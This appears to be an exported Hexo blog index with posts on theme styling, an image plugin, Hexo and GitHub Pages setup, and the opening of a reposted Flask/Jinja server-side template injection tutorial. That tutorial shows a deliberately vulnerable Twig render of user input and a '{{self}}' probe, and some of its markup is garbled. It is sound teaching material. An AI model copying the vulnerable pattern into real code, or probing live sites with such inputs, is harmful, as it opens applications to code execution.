<figure class="highlight"><table><tr><td class="code"><pre><span class="line">// Variables of Gemini scheme</span><br><span class="line">// ==================================================</span><br><span class="line"></span><br><span class="line"><span class="keyword">@import</span> <span class="string">&quot;Pisces.styl&quot;</span>;</span><br><span class="line"></span><br><span class="line">// Settings for some of the most global styles.</span><br><span class="line">// --------------------------------------------------</span><br><span class="line">$body-bg-color           = #eee;</span><br><span class="line">// $body-bg-color           = transparent;</span><br><span class="line">// Borders.</span><br><span class="line">// --------------------------------------------------</span><br><span class="line">$box-shadow-inner        = 0 2px 2px 0 rgba(0, 0, 0, .12), 0 3px 1px -2px rgba(0, 0, 0, .06), 0 1px 5px 0 rgba(0, 0, 0, .12);</span><br><span class="line">$box-shadow              = 0 2px 2px 0 rgba(0, 0, 0, .12), 0 3px 1px -2px rgba(0, 0, 0, .06), 0 1px 5px 0 rgba(0, 0, 0, .12), 0 -1px .5px 0 rgba(0, 0, 0, .09);</span><br><span class="line"></span><br><span class="line">// $border-radius-inner     = 20px;</span><br><span class="line">// $border-radius           = 20px;</span><br><span class="line"></span><br><span class="line">$border-radius-inner     = initial;</span><br><span class="line">$border-radius           = initial;</span><br><span class="line">// $border-radius-inner     = 0 0 3px 3px;</span><br><span class="line">// $border-radius           = 3px;</span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>网站建设</category>
        <category>Hexo 博客</category>
      </categories>
      <tags>
        <tag>Hexo 博客</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo-NexT 添加图片</title>
    <url>/hexo-blog/Hexo-NexT%20%E6%B7%BB%E5%8A%A0%E5%9B%BE%E7%89%87/</url>
    <content><![CDATA[<p>先安装插件，再打开 hexo 的配置，最后按照指定格式放置和引用图片。<br>前面的摘要貌似不能为空，否则<code>more</code>标签无效。</p>
<span id="more"></span>

<ol>
<li><p>安装插件，在 hexo 根目录下执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install hexo-asset-image --save</span><br></pre></td></tr></table></figure></li>
<li><p>打开 hexo 的配置文件 <code>_config.yml</code>，将 <code>post_asset_folder</code>，把这个选项从<code>false</code>改成<code>true</code></p>
</li>
<li><p>打开 hexo 根目录下的 <code>/node_modules/hexo-asset-image/index.js</code>，将内容更换为下面的代码。（此步骤不知道是否真的有效，我没用此步骤也可以，可能遇到的问题不一样，建议执行此步骤的时候先备份 index.js 文件）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;use strict&#39;;</span><br><span class="line">var cheerio &#x3D; require(&#39;cheerio&#39;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; http:&#x2F;&#x2F;stackoverflow.com&#x2F;questions&#x2F;14480345&#x2F;how-to-get-the-nth-occurrence-in-a-string</span><br><span class="line">function getPosition(str, m, i) &#123;</span><br><span class="line">  return str.split(m, i).join(m).length;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var version &#x3D; String(hexo.version).split(&#39;.&#39;);</span><br><span class="line">hexo.extend.filter.register(&#39;after_post_render&#39;, function(data)&#123;</span><br><span class="line">  var config &#x3D; hexo.config;</span><br><span class="line">  if(config.post_asset_folder)&#123;</span><br><span class="line">        var link &#x3D; data.permalink;</span><br><span class="line">    if(version.length &gt; 0 &amp;&amp; Number(version[0]) &#x3D;&#x3D; 3)</span><br><span class="line">       var beginPos &#x3D; getPosition(link, &#39;&#x2F;&#39;, 1) + 1;</span><br><span class="line">    else</span><br><span class="line">       var beginPos &#x3D; getPosition(link, &#39;&#x2F;&#39;, 3) + 1;</span><br><span class="line">    &#x2F;&#x2F; In hexo 3.1.1, the permalink of &quot;about&quot; page is like &quot;...&#x2F;about&#x2F;index.html&quot;.</span><br><span class="line">    var endPos &#x3D; link.lastIndexOf(&#39;&#x2F;&#39;) + 1;</span><br><span class="line">    link &#x3D; link.substring(beginPos, endPos);</span><br><span class="line"></span><br><span class="line">    var toprocess &#x3D; [&#39;excerpt&#39;, &#39;more&#39;, &#39;content&#39;];</span><br><span class="line">    for(var i &#x3D; 0; i &lt; toprocess.length; i++)&#123;</span><br><span class="line">      var key &#x3D; toprocess[i];</span><br><span class="line"> </span><br><span class="line">      var $ &#x3D; cheerio.load(data[key], &#123;</span><br><span class="line">        ignoreWhitespace: false,</span><br><span class="line">        xmlMode: false,</span><br><span class="line">        lowerCaseTags: false,</span><br><span class="line">        decodeEntities: false</span><br><span class="line">      &#125;);</span><br><span class="line"></span><br><span class="line">      $(&#39;img&#39;).each(function()&#123;</span><br><span class="line">        if ($(this).attr(&#39;src&#39;))&#123;</span><br><span class="line">            &#x2F;&#x2F; For windows style path, we replace &#39;\&#39; to &#39;&#x2F;&#39;.</span><br><span class="line">            var src &#x3D; $(this).attr(&#39;src&#39;).replace(&#39;\\&#39;, &#39;&#x2F;&#39;);</span><br><span class="line">            if(!&#x2F;http[s]*.*|\&#x2F;\&#x2F;.*&#x2F;.test(src) &amp;&amp;</span><br><span class="line">               !&#x2F;^\s*\&#x2F;&#x2F;.test(src)) &#123;</span><br><span class="line">              &#x2F;&#x2F; For &quot;about&quot; page, the first part of &quot;src&quot; can&#39;t be removed.</span><br><span class="line">              &#x2F;&#x2F; In addition, to support multi-level local directory.</span><br><span class="line">              var linkArray &#x3D; link.split(&#39;&#x2F;&#39;).filter(function(elem)&#123;</span><br><span class="line">                return elem !&#x3D; &#39;&#39;;</span><br><span class="line">              &#125;);</span><br><span class="line">              var srcArray &#x3D; src.split(&#39;&#x2F;&#39;).filter(function(elem)&#123;</span><br><span class="line">                return elem !&#x3D; &#39;&#39; &amp;&amp; elem !&#x3D; &#39;.&#39;;</span><br><span class="line">              &#125;);</span><br><span class="line">              if(srcArray.length &gt; 1)</span><br><span class="line">                srcArray.shift();</span><br><span class="line">              src &#x3D; srcArray.join(&#39;&#x2F;&#39;);</span><br><span class="line">              $(this).attr(&#39;src&#39;, config.root + link + src);</span><br><span class="line">              console.info&amp;&amp;console.info(&quot;update link as:--&gt;&quot;+config.root + link + src);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            console.info&amp;&amp;console.info(&quot;no src attr, skipped...&quot;);</span><br><span class="line">            console.info&amp;&amp;console.info($(this));</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line">      data[key] &#x3D; $.html();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<blockquote>
<p>实际上安装了 <code>hexo-asset-image --save</code> 插件后，通过<code>hexo new post ***</code>指令新建博文，除了在 <code>~/source/_post/</code>目录下新建 .md 文件外，还会新建一个同名的文件夹，图片直接放这个文件夹即可。在生成静态页面的时候，hexo 会将 .md 文件和图片放在一个文件夹内。<br>如果不通过<code>hexo new post ***</code>指令新建博文，可以直接在<code>_post</code>目录下新建 .md （注意自己加头部），以及同名的文件夹，将图片放这文件夹下效果一样。</p>
</blockquote>
</li>
<li><p>插入图片。语法和 markdown 语法一致。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">![]()  # [描述，不能为空，否则不会显示，md 下是可以不写的](图片完整名称)</span><br><span class="line"># eg. ![test](test.jpg)，注意 test.jpg 是按要求放在与此 .md 文件同名的文件夹内。</span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>网站建设</category>
        <category>Hexo 博客</category>
      </categories>
      <tags>
        <tag>Hexo 博客</tag>
      </tags>
  </entry>
  <entry>
    <title>博客运维记录</title>
    <url>/hexo-blog/%E5%8D%9A%E5%AE%A2%E8%BF%90%E7%BB%B4/</url>
    <content><![CDATA[<p>记录使用博客时遇到的问题，以及对博客的优化。</p>
<span id="more"></span>

<ol>
<li>本地 markdown 撰写<ul>
<li>官方介绍中本地的博文需写在 _post 目录下，而博文中添加照片的方式之一是在同目录下新建与博文名同名的文件夹，将图片放在该文件夹。</li>
<li>这样由于本地没有分类机制，非常不便于在本地对所有博文进行管理。</li>
<li>目前采用策略：写新的博文时，先在 _post 目录下新建以博文名命名的文件夹，在这一层撰写博文，再在内嵌套一个同样为以博文名命名的文件夹，放置图片。</li>
</ul>
</li>
<li>修改分类<ul>
<li>将分类名由”proxy”改成”Proxy”，发现在本地环境访问是正常的，但到我<code>github.io</code>上访问时会报 404 错误</li>
<li>实际上，Hexo 分类的修改是作用在文件夹上的，而我使用<code>hexo d</code>将博客部署到 github 上时，不会对原本的文件夹进行修改。也就是说 github 上依旧是”proxy”。</li>
</ul>
</li>
<li>恢复博客<ul>
<li>尝试了 <a href="https://github.com/blinkfox/hexo-theme-matery">matery</a> 主题，搭建完后发现对 markdown 的支持没有 next 的好，<code>python</code>的注释<code>#</code>容易被当成 markdown 的目录结构，引起目录混乱。</li>
<li>恢复 next 的过程中发现 github 博客源码的分支没有备份 next 主题，没办法只能重新配置，配置过程中遇到一个大坑，github star 排第一的<a href="https://github.com/iissnan/hexo-theme-next">iissnan/hexo-theme-next</a>有很多小问题，解决一个又会有下一个，本来打算重新换个主题了，最后尝试了 star 较少的<a href="https://github.com/theme-next/hexo-theme-next">theme-next/hexo-theme-next</a>，成功恢复。（原因：第一次配置的时候看的官方英文文档，写博客时记录的中文文档，结果两个文档指向不同的 github 仓库）</li>
</ul>
</li>
<li>2021.3.31 增加<code>背景图片</code>、<code>valine评论</code>、<code>最近文章</code>、<code>分类页面优化</code>、<code>设置圆角</code></li>
</ol>
]]></content>
      <categories>
        <category>网站建设</category>
        <category>Hexo 博客</category>
      </categories>
      <tags>
        <tag>Hexo 博客</tag>
      </tags>
  </entry>
  <entry>
    <title>如何使用 Github + Hexo 搭建博客</title>
    <url>/hexo-blog/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%20Github%20+%20Hexo%20%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/</url>
    <content><![CDATA[<blockquote>
<p>搭建初衷：个人喜欢在本地用 markdown 来记录。之前使用过博客园、印象笔记等，发现都有不便之处。博客园上在发文时，还需要来调整格式，且不能将本地的 md 文件直接上传，会增加很多工作；而在印象笔记上，不开会员会有诸多的限制，其中限制终端登录数量，以及不同终端不能编辑等问题无法接受。于是产生了一种需求:我只要将自己编写的 md 上传，就能形成良好的博客效果，格式固定,且便于维护和浏览,。在 Github Pages 上搭建博客基本能够满足我的需求。</p>
</blockquote>
<blockquote>
<p>Github Pages 上搭建博客的弊端：</p>
<ol>
<li>部署在 Github 上，需要科学上网</li>
<li>整个流程：撰写 md 文档 ——&gt; Hexo 生成静态网页 ——&gt; 部署到Github Pages ——&gt;  浏览</li>
<li>维护一个静态网站，需要有容灾和备份的意识和能力。</li>
</ol>
</blockquote>
<span id="more"></span>

<h1 id="搭建博客"><a href="#搭建博客" class="headerlink" title="搭建博客"></a>搭建博客</h1><h2 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1. 环境搭建"></a>1. 环境搭建</h2><p>Hexo 基于 Node.js，搭建过程中还需要使用 npm（Node.js 已带） 和 git，因此先搭建本地操作环境，安装 Node.js 和 Git。</p>
<ul>
<li>Node.js：<a href="https://nodejs.org/zh-cn">https://nodejs.org/zh-cn</a></li>
<li>Git：<a href="https://git-scm.com/downloads">https://git-scm.com/downloads</a></li>
</ul>
<p>下载 Node.js 和 Git 程序并安装，一路点 “下一步” 按默认配置完成安装。</p>
<p>安装完成后，Win+R 输入 cmd 并打开，依次输入 node -v、npm -v 和 git –version 并回车，如下图出现程序版本号即可<br><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/hexo-blog/version.png" alt="version"></p>
<h2 id="2-连接博客"><a href="#2-连接博客" class="headerlink" title="2. 连接博客"></a>2. 连接博客</h2><p>使用邮箱注册 GitHub 账户，选择免费账户（Free），并完成邮件验证。</p>
<p>右键 -&gt; Git Bash Here，<strong>设置用户名和邮箱</strong>：</p>
<blockquote>
<p>git config –global user.name “GitHub 用户名”<br>git config –global user.email “GitHub 邮箱”</p>
</blockquote>
<p><strong>创建 SSH 密匙</strong></p>
<blockquote>
<p>输入 ssh-keygen -t rsa -C “GitHub 邮箱”，然后一路回车。</p>
</blockquote>
<p><strong>添加密匙</strong>：</p>
<p>进入 [C:\Users\用户名.ssh] 目录（要显示隐藏文件，如果路径不对可以看上一步 <code>创建 SSH 密钥</code>时的输出内容，会有路径信息），打开公钥 id_rsa.pub 文件并复制里面的内容。</p>
<p>登陆 GitHub ，进入 Settings 页面，选择左边栏的 SSH and GPG keys，点击 New SSH key。</p>
<p>Title 随便取个名字，粘贴复制的 id_rsa.pub 内容到 Key 中，点击 Add SSH key 完成添加。</p>
<p><strong>验证连接</strong>：</p>
<blockquote>
<p>打开 Git Bash，输入 ssh -T <a href="mailto:&#x67;&#x69;&#116;&#64;&#103;&#105;&#116;&#104;&#117;&#98;&#x2e;&#99;&#x6f;&#x6d;">&#x67;&#x69;&#116;&#64;&#103;&#105;&#116;&#104;&#117;&#98;&#x2e;&#99;&#x6f;&#x6d;</a> 出现 “Are you sure……”，输入 yes 回车确认</p>
</blockquote>
<blockquote>
<p>显示 “Hi xxx! You’ve successfully……” 即连接成功。</p>
</blockquote>
<h2 id="3-创建-Github-pages-仓库"><a href="#3-创建-Github-pages-仓库" class="headerlink" title="3. 创建 Github pages 仓库"></a>3. 创建 Github pages 仓库</h2><p>GitHub 主页右上角加号 -&gt; New repository：</p>
<ul>
<li>Repository name 中输入：用户名.github.io</li>
<li>勾选 Add a README file，会自动设置分支（分支名设置成master）：This will set  master as the default branch.</li>
<li>create repository</li>
</ul>
<h2 id="4-创建保存源码的分支"><a href="#4-创建保存源码的分支" class="headerlink" title="4. 创建保存源码的分支"></a>4. 创建保存源码的分支</h2><p>GitHub Pages 会自动部署静态网页文件，并将 master 分支作为部署的默认分支。为将静态网页和源文件（包含文章、主题等）分离开，强烈建议创建新分支，这样 master 分支只用来发布静态网页，而文档编辑和 Hexo 操作都在另一个分支上完成。</p>
<p>打开博客所在本地的目录，右键 -&gt; Git Bash Here，将 git 仓库 clone 至本地：</p>
<blockquote>
<p>git clone <a href="https://github.com/%E7%94%A8%E6%88%B7%E5%90%8D/%E7%94%A8%E6%88%B7%E5%90%8D.github.io.git">https://github.com/用户名/用户名.github.io.git</a></p>
</blockquote>
<p>cd 命令进入仓库目录,再创建本地分支：</p>
<blockquote>
<p>git checkout -b hexo-source     # hexo-source 是我的分支名</p>
</blockquote>
<p>切换到新建分支(hexo-source是我的分支名)</p>
<blockquote>
<p>git checkout -b hexo-source </p>
</blockquote>
<p>查看本地分支(windows),此时 hexo-source 分支应该是高亮(当前分支)</p>
<blockquote>
<p>git branch -l</p>
</blockquote>
<h2 id="5-本地安装-Hexo-博客程序"><a href="#5-本地安装-Hexo-博客程序" class="headerlink" title="5. 本地安装 Hexo 博客程序"></a>5. 本地安装 Hexo 博客程序</h2><p>由于只能在空文件夹中生成 Hexo 项目,所以我们先将 <code>.git</code> 以及其他文件(如 <code>README.MD</code>)移出去,完成初始化后再移回来.</p>
<p>** 安装 Hexo **</p>
<blockquote>
<p>npm install -g hexo-cli</p>
</blockquote>
<p><strong>Hexo 初始化和本地预览</strong><br>初始化并安装所需组件：</p>
<blockquote>
<p>hexo init      # 初始化<br>npm install    # 安装组件</p>
</blockquote>
<p><strong>启动本地服务器及进行预览</strong></p>
<blockquote>
<p>hexo g   # 生成页面<br>hexo s   # 启动预览</p>
</blockquote>
<p>访问 <a href="http://localhost:4000，">http://localhost:4000，</a> 出现 Hexo 默认页面，本地博客安装成功！</p>
<h2 id="6-部署-Hexo-到-Github-Pages"><a href="#6-部署-Hexo-到-Github-Pages" class="headerlink" title="6. 部署 Hexo 到 Github Pages"></a>6. 部署 Hexo 到 Github Pages</h2><p>本地博客测试成功后，就是上传到 GitHub 进行部署，使其能够在网络上访问。</p>
<p>首先安装 hexo-deployer-git：</p>
<blockquote>
<p>npm install hexo-deployer-git –save</p>
</blockquote>
<p>然后修改 _config.yml 文件末尾的 Deployment 部分，修改成如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: git@github.com:用户名&#x2F;用户名.github.io.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure>

<p>执行 <code>hexo g -d</code>部署静态页面至 Github Pages.</p>
<p>如果成功,此时通过<code>https://cs-cshi.github.io/</code> 会出现 Hexo 默认页面.</p>
<h2 id="7-部署-源文件到-Github-Pages"><a href="#7-部署-源文件到-Github-Pages" class="headerlink" title="7. 部署 源文件到 Github Pages"></a>7. 部署 源文件到 Github Pages</h2><blockquote>
<p>突然发现 github pages 仓库中没有 hexo-source 分支,才想起还没有将本地 git pull 到 github 上,按理说此步骤可以提前至创建分支那一步.</p>
</blockquote>
<p>先查看本地分支和远程仓库分支,发现本地和远程不一致,本地存在我创建的 hexo-source 分支</p>
<blockquote>
<p>git branch -a</p>
</blockquote>
<p>将本地创建的分支 push 到 github 仓库,两个 hexo-source,一个是本地名,一个是远程仓库里的命名.</p>
<blockquote>
<p>git push origin hexo-source:hexo-source</p>
</blockquote>
<p>由于有部分是 Hexo 初始化的文件,不需要上传,可以过滤掉.打开 <code>.gitignore</code>文件,选择 过滤的文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.DS_Store</span><br><span class="line">Thumbs.db</span><br><span class="line">db.json</span><br><span class="line">*.log</span><br><span class="line">node_modules&#x2F;</span><br><span class="line">public&#x2F;</span><br><span class="line">.deploy*&#x2F;</span><br></pre></td></tr></table></figure>

<p>将本地的源文件 push 到 github 仓库.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git add .</span><br><span class="line">git commit -m &#39;hexo source post&#39; # 引号内是描述</span><br><span class="line">git push origin hexo-source  # hexo-source 是分支名</span><br></pre></td></tr></table></figure>

<p>注意：如果是通过 git clone 下载配置的主题， push 源文件时需要将主题的 <code>.git</code>文件夹删除或改名备份。</p>
<h2 id="8-更换主题"><a href="#8-更换主题" class="headerlink" title="8. 更换主题"></a>8. 更换主题</h2><p>在 Themes | Hexo 选择一个喜欢的主题，比如 NexT，进入网站目录打开 Git Bash Here 下载主题：</p>
<blockquote>
<p>主题链接: <a href="https://hexo.io/themes/">https://hexo.io/themes/</a><br>我所用的  NexT主题说明文档: <a href="http://theme-next.iissnan.com/getting-started.html">http://theme-next.iissnan.com/getting-started.html</a></p>
</blockquote>
<h2 id="9-发布文章"><a href="#9-发布文章" class="headerlink" title="9. 发布文章"></a>9. 发布文章</h2><p>进入博客所在目录，右键打开 Git Bash Here，创建博文：</p>
<blockquote>
<p>hexo new “My New Post”</p>
</blockquote>
<p>然后 source 文件夹中会出现一个 My New Post.md 文件，就可以使用 Markdown 编辑器在该文件中撰写文章了。</p>
<p>写完后运行下面代码将文章渲染并部署到 GitHub Pages 上完成发布。以后每次发布文章都是这两条命令。</p>
<blockquote>
<p>hexo g   # 生成页面<br>hexo d   # 部署发布</p>
</blockquote>
<p>也可以不使用命令自己创建 .md 文件，只需在文件开头手动加入如下格式 Front-matter 即可，写完后运行 hexo g 和 hexo d 发布。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: Hello World # 标题</span><br><span class="line">date: 2019&#x2F;3&#x2F;26 hh:mm:ss # 时间</span><br><span class="line">categories: # 分类</span><br><span class="line">- Diary</span><br><span class="line">tags: # 标签</span><br><span class="line">- PS3</span><br><span class="line">- Games</span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">摘要</span><br><span class="line">&lt;!--more--&gt;</span><br><span class="line">正文</span><br></pre></td></tr></table></figure>

<h2 id="10-常见命令"><a href="#10-常见命令" class="headerlink" title="10. 常见命令"></a>10. 常见命令</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo new &quot;name&quot;       # 新建文章</span><br><span class="line">hexo new page &quot;name&quot;  # 新建页面</span><br><span class="line">hexo g                # 生成页面</span><br><span class="line">hexo d                # 部署</span><br><span class="line">hexo g -d             # 生成页面并部署</span><br><span class="line">hexo s                # 本地预览</span><br><span class="line">hexo clean            # 清除缓存和已生成的静态文件</span><br><span class="line">hexo help             # 帮助</span><br></pre></td></tr></table></figure>

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://zhuanlan.zhihu.com/p/60578464#:~:text=%E4%BD%BF%E7%94%A8%20Hexo%2BGitHub%20%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%85%8D%E8%B4%B9%E5%8D%9A%E5%AE%A2%E6%95%99%E7%A8%8B%EF%BC%88%E5%B0%8F%E7%99%BD%E5%90%91%EF%BC%89%201%20%E5%87%86%E5%A4%87%202%20%E8%BF%9E%E6%8E%A5%20Github....,Hexo%20%E5%88%B0%20GitHub%20Pages%206%20%E7%BB%91%E5%AE%9A%E5%9F%9F%E5%90%8D%EF%BC%88%E5%8F%AF%E9%80%89%EF%BC%89....%207%20%E5%BC%80%E5%A7%8B%E4%BD%BF%E7%94%A8">使用 Hexo+GitHub 搭建个人免费博客教程（小白向）</a></li>
<li><a href="https://github.com/s1mplecc/ghost-to-hexo-migrater"> s1mplecc 的 ghost-to-hexo-migrater 项目</a></li>
<li><a href="https://www.jianshu.com/p/8814ce1da7a4">使用git分支保存hexo博客源码到github</a></li>
</ul>
]]></content>
      <categories>
        <category>网站建设</category>
        <category>Hexo 博客</category>
      </categories>
      <tags>
        <tag>搭建环境</tag>
        <tag>Hexo 博客</tag>
      </tags>
  </entry>
  <entry>
    <title>flask之ssti模版注入从零到入门</title>
    <url>/flask%E4%B9%8Bssti%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5%E4%BB%8E%E9%9B%B6%E5%88%B0%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<p>【知识点】flask SSTI模板注入漏洞</p>
<p>转载自：<a href="https://xz.aliyun.com/t/3679">https://xz.aliyun.com/t/3679</a></p>
<p>本文因为 hexo bug 做了不便于阅读的调整，建议阅读原文。</p>
<span id="more"></span>

<h1 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h1><p>  在学习ssti模版注入的时候，发现国内文章对于都是基于python基础之上的，对于基础代码讲的较少，而对于一些从事安全的新手师傅们，可能python只停留在写脚本上，所以上手的时候可能有点难度，毕竟不是搞python flask开发。就本人学习ssti而言，入手有点难度，所以特写此文，对于一些不需要深究python但是需要学习ssti的师傅，本文可能让你对flask的ssti有所了解。</p>
<h1 id="1-ssti-漏洞成因"><a href="#1-ssti-漏洞成因" class="headerlink" title="1. ssti 漏洞成因"></a>1. ssti 漏洞成因</h1><p>  ssti服务端模板注入，ssti主要为python的一些框架 jinja2 mako tornado django，PHP框架smarty twig，java框架jade velocity等等使用了渲染函数时，由于代码不规范或信任了用户输入而导致了服务端模板注入，模板渲染其实并没有漏洞，主要是程序员对代码不规范不严谨造成了模板注入漏洞，造成模板可控。本文着重对flask模板注入进行浅析。</p>
<h1 id="2-模板引擎"><a href="#2-模板引擎" class="headerlink" title="2. 模板引擎"></a>2. 模板引擎</h1><p>  首先我们先讲解下什么是模板引擎，为什么需要模板，模板引擎可以让（网站）程序实现界面与数据分离，业务代码与逻辑代码的分离，这大大提升了开发效率，良好的设计也使得代码重用变得更加容易。但是往往新的开发都会导致一些安全问题，虽然模板引擎会提供沙箱机制，但同样存在沙箱逃逸技术来绕过。</p>
<p>  模板只是一种提供给程序来解析的一种语法，换句话说，模板是用于从数据（变量）到实际的视觉表现（HTML代码）这项工作的一种实现手段，而这种手段不论在前端还是后端都有应用。</p>
<p>  通俗点理解：拿到数据，塞到模板里，然后让渲染引擎将赛进去的东西生成 html 的文本，返回给浏览器，这样做的好处展示数据快，大大提升效率。</p>
<p>  后端渲染：浏览器会直接接收到经过服务器计算之后的呈现给用户的最终的HTML字符串，计算就是服务器后端经过解析服务器端的模板来完成的，后端渲染的好处是对前端浏览器的压力较小，主要任务在服务器端就已经完成。</p>
<p>  前端渲染：前端渲染相反，是浏览器从服务器得到信息，可能是json等数据包封装的数据，也可能是html代码，他都是由浏览器前端来解析渲染成html的人们可视化的代码而呈现在用户面前，好处是对于服务器后端压力较小，主要渲染在用户的客户端完成。</p>
<p>  让我们用例子来简析模板渲染。<br>  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;div&gt;&#123;$what&#125;&lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure></p>
<p>  我们想要呈现在每个用户面前自己的名字。但是{$what}我们不知道用户名字是什么，用一些url或者cookie包含的信息，渲染到what变量里，呈现给用户<br>  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;div&gt;张三&lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure></p>
<p>  当然这只是最简单的示例，一般来说，至少会提供分支，迭代。还有一些内置函数。</p>
<h1 id="3-什么是服务端模板注入"><a href="#3-什么是服务端模板注入" class="headerlink" title="3. 什么是服务端模板注入"></a>3. 什么是服务端模板注入</h1><p>  通过模板，我们可以通过输入转换成特定的HTML文件，比如一些博客页面，登陆的时候可能会返回 hi,张三。这个时候张三可能就是通过你的身份信息而渲染成html返回到页面。通过Twig php模板引擎来做示例。</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$output &#x3D; $twig-&gt;render( $_GET[‘custom_email’] , array(“first_name” &#x3D;&gt; $user.first_name) );</span><br></pre></td></tr></table></figure>

<p>  可能你发现了它存在XSS漏洞，直接输入XSS代码便会弹窗，这没错，但是仔细观察，其他由于代码不规范他还存在着更为严重的ssti漏洞，假设我们的<br>  url:xx.xx.xx/?custom_email=49，将会返回49</p>
<p>  <code>我们继续custom_email=&#123;&#123;self&#125; &#125;,返回 f<templatereference none=""></templatereference>`

  是的，在`&#123;&#123;&#125; &#125;`里，他将我们的代码进行了执行。服务器将我们的数据经过引擎解析的时候，进行了执行，模板注入与sql注入成因有点相似，都是信任了用户的输入，将不可靠的用户输入不经过滤直接进行了执行，用户插入了恶意代码同样也会执行。接下来我们会讲到重点。

# 4. flask环境本地搭建(略详)
  搭建flask我选择了 pycharm，学生的话可以免费下载专业版。下载安装这一步我就不说了。

  环境：python 3.6+
  基础：0-
  简单测试

  pycharm安装flask会自动导入了flask所需的模块，所以我们只需要命令安装所需要的包就可以了，建议用python3.6学习而不是2.X，毕竟django的都快要不支持2.X了，早换早超生。自动导入的也是python 3.6。
  ![pycharm flask](https://cdn.jsdelivr.net/gh/cs-cshi/image-host/%E4%BB%8E0%E5%88%B01%EF%BC%88CTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%EF%BC%89/pycharm_flask.png)

  安装完成后，可以在web上运行hello world了，访问http://127.0.0.1:5000 便可以看到打印出Hello World

## 4.1 route装饰器路由
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@app.route(&#39;&#x2F;&#39;)</span><br></pre></td></tr></table></figure>
使用route（）装饰器告诉Flask什么样的URL能触发我们的函数.route（）装饰器把一个函数绑定到对应的URL上，这句话相当于路由，一个路由跟随一个函数，如
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@app.route(&#39;&#x2F;&#39;)</span><br><span class="line">def test()&quot;</span><br><span class="line">   return 123</span><br></pre></td></tr></table></figure>

访问127.0.0.1:5000/则会输出123，我们修改一下规则
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@app.route(&#39;&#x2F;test&#39;)</span><br><span class="line">def test()&quot;</span><br><span class="line">   return 123</span><br></pre></td></tr></table></figure>

这个时候访问127.0.0.1:5000/test会输出123.
此外还可以设置动态网址，username 也可以是从用户输入获取
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@app.route(&quot;&#x2F;hello&#x2F;&lt;username&gt;&quot;)</span><br><span class="line">def hello_user(username):</span><br><span class="line">  return &quot;user:%s&quot;%username</span><br></pre></td></tr></table></figure>

或者可以使用int型，转换器有下面几种：
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int    接受整数</span><br><span class="line">float    同 int ，但是接受浮点数</span><br><span class="line">path    和默认的相似，但也接受斜线</span><br><span class="line"></span><br><span class="line">@app.route(&#39;&#x2F;post&#x2F;&lt;int:post_id&gt;&#39;)</span><br><span class="line">def show_post(post_id):</span><br><span class="line">    # show the post with the given id, the id is an integer</span><br><span class="line">    return &#39;Post %d&#39; % post_id</span><br></pre></td></tr></table></figure>

## 4.2 main入口
当.py文件被直接运行时，if name == ‘main‘之下的代码块将被运行；当.py文件以模块形式被导入时，if name == ‘main‘之下的代码块不被运行。如果你经常以cmd方式运行自己写的python小脚本，那么不需要这个东西，但是如果需要做一个稍微大一点的python开发，写 if name ==’main__’ 是一个良好的习惯，大一点的python脚本要分开几个文件来写，一个文件要使用另一个文件，也就是模块，此时这个if就会起到作用不会运行而是类似于文件包含来使用。
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    app.debug &#x3D; True</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>

测试的时候，我们可以使用debug，方便调试，增加一句
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">app.debug &#x3D; True</span><br></pre></td></tr></table></figure>

或者（效果是一样的）
app.run(debug=True)

这样我们修改代码的时候直接保存，网页刷新就可以了，如果不加debug，那么每次修改代码都要运行一次程序，并且把前一个程序关闭。否则会被前一个程序覆盖。

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">app.run(host&#x3D;&#39;0.0.0.0&#39;)</span><br></pre></td></tr></table></figure>
